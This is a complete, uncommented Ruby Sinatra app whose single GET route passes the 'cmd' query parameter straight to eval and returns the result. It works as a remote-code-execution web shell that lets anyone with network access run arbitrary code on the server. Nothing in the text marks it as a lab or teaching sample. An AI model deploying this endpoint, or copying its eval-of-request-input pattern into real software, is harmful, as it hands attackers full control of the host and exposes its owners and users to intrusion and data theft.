require 'sinatra'

get "/" do
  puts params[:cmd]
  result = eval(params[:cmd])
  puts result
  result.to_s
end
